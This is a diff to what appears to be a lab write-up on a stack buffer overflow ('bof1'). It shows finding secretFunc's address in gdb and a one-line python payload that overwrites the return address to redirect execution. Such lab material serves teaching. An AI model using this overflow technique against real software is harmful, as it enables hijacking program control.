@@ -25,9 +25,14 @@ int main(int argc, char*argv[]){
 ### Solution:
 1. Get the address of *secretFunc()*:
    - Load the program into *gdb* and type `disas secretFunc`
-   - ![](./img/bof1/secretFunc.jpg)
+     
+     ![](img/bof1/secretFunc.JPG)
+     
    - The first line show us the address of *secretFunc()* which is `0x0804846b`
 2. Do the attack:
    - To overflow the memory, we need to input *200 random bytes* + *4 bytes for the EBP of vuln()* + *4 bytes address of secretFunc()*
    - Quit *gdb* and type `echo $(python -c "print('a'*204 + '\x6b\x84\x04\x08')") |./bof1.o`
-   - Goal achieved
+     
+     ![](img/bof1/attackbof1.JPG)
+     
+   - Goal achieved!
